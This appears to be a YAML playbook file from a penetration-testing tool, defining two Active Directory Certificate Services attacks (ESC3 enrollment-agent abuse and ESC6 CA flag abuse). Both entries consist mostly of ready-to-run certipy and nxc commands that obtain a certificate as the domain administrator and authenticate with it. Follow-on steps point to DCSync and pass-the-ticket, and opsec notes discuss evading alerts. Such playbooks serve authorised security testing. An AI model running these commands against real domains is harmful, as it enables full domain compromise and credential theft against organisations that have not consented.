  - id: adcs_esc3
    name: ADCS ESC3 — Certificate Request Agent Abuse
    tab: ADCS
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, CA_NAME, CA_IP]
    requires_priv: null
    tags: [adcs, esc3, cert, enrollment-agent, privesc]
    description: >
      ESC3: A template allows Certificate Request Agent enrollment, and a
      second template allows enrolment on behalf of another user.
      Combine both to obtain a certificate authenticating as any user.
    commands:
      - label: Find ESC3 vulnerable templates
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout"
      - label: Step 1 — Request enrollment agent cert
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template EnrollmentAgent"
      - label: Step 2 — Request cert on behalf of DA
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template User -on-behalf-of '{DOMAIN}\\administrator' -pfx agent.pfx"
      - label: Authenticate with obtained cert
        cmd: "certipy auth -pfx administrator.pfx -dc-ip {DC_IP}"
    next_steps:
      - "Use recovered NTLM hash for DCSync"
      - "Obtain TGT for pass-the-ticket"
    opsec: "Certificate requests are logged in the CA event log (event 4886). Two-step request may raise alerts."
    cleanup:
      - label: Revoke issued certificates (CA admin only)
        cmd: "certutil -revoke <serial> -config '{CA_IP}\\{CA_NAME}'"

  - id: adcs_esc6
    name: ADCS ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
    tab: ADCS
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, CA_NAME, CA_IP]
    requires_priv: null
    tags: [adcs, esc6, cert, san, ca-flag]
    description: >
      ESC6: The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, allowing
      any template (even those with SAN disabled) to accept a user-specified
      SAN. Effectively makes every template ESC1-vulnerable.
    commands:
      - label: Check CA flags
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -stdout | grep -A5 'EditFlags'"
      - label: Confirm with certutil on target
        cmd: "nxc smb {CA_IP} -u {USERNAME} -p '{PASSWORD}' -x 'certutil -config \"{CA_IP}\\{CA_NAME}\" -getreg policy\\EditFlags'"
      - label: Request cert with SAN override (any template)
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template User -upn administrator@{DOMAIN}"
      - label: Authenticate with cert
        cmd: "certipy auth -pfx administrator.pfx -dc-ip {DC_IP}"
    next_steps:
      - "ESC6 affects ALL templates — escalation is trivial"
      - "Recommend CA flag remediation as critical finding"
    opsec: "Request logs identical to ESC1. Single cert request — low noise."

